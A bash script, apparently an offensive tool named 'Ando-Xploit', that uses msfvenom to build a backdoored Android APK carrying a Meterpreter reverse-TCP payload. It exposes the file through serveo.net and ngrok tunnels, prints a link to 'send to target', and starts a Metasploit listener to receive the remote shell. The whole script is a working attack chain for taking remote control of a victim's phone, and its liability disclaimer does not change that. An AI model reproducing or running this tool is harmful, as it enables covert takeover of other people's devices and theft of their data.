#!/bin/bash
#Copying This Code Without Credits Will Open The Hell Ports For You and scratch your fireball too -_-

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

banner(){
printf "\e[1;77m                                                                    \e[0m\n"
printf "\e[1;77m   #####  ##	#  #####   ######$   ## ## ####  #          #   #       \e[0m\n"
printf "\e[1;77m   #   #  # #	#  #	#  #	 #    # #  #  #  #              #       \e[0m\n"
printf "\e[1;77m   #   #  #  #	#  #	#  #	 #     #   #  #  #     ###  #  ###      \e[0m\n"
printf "\e[1;77m   #####  #   #	#  #	#  #	 # =   #   ###   #    #   # #   #       \e[0m\n"
printf "\e[1;77m   #   #  #    ##  #	#  #	 #    # #  #     #    #   # #   #       \e[0m\n"
printf "\e[1;77m   #   #  #	#  #####   ######$   #   # #     ####  ###  #   ##      \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Xploiting Tool coded by:  @t4nny \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Ando-Xploit ::\e[0m\n"
printf "\n"
printf "Copying This Code Without Credits Will Open The Hell Ports For You and scratch your fireball too -_- \n\n"

}             

start()
{

lhost="serveo.net"
port="${port:-${default_port}}"

pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter Backdoor Name: \e[0m' name
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter TLD : \e[0m' tld

printf "\n"
sleep 2

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Serveo...\e[0m"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }

$(which sh) -c 'ssh -R 44321:localhost:4444 serveo.net' > /dev/null 2>&1 & 
sleep 5

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok tcp 8080 > /dev/null 2>&1 &
sleep 10

printf "\n"

printf "\e[1;92m[\e[0m*\e[1;92m] Creating Backdoor APK...\n"
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=44321 R >/home/phib3r/Desktop/$name.apk

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "0.tcp.ngrok.io:[0-9a-z]*")

#ssh -R tanny.serveo.net:80:$link serveo.net

printf "\n"

xterm -e $(which sh) -c 'ssh -R '$tld'.serveo.net:80:'$link' serveo.net 2> /dev/null ' &
disown
#ssh -R up.serveo.net:80:0.tcp.ngrok.io:17364 serveo.net

printf "\n"
sleep 10
send_li=''$tld'.serveo.net'

printf "\n"



printf "###############################################################################################\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Apk Created in /root Directory Named $name.apk\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Send the direct link to target:\e[0m\e[1;77m %s' https://$send_li/$name.apk\n"
printf "###############################################################################################\n"
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Listener...\e[0m\n"
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0 ; set lport 4444; run;"

	
}

banner
dependencies
start
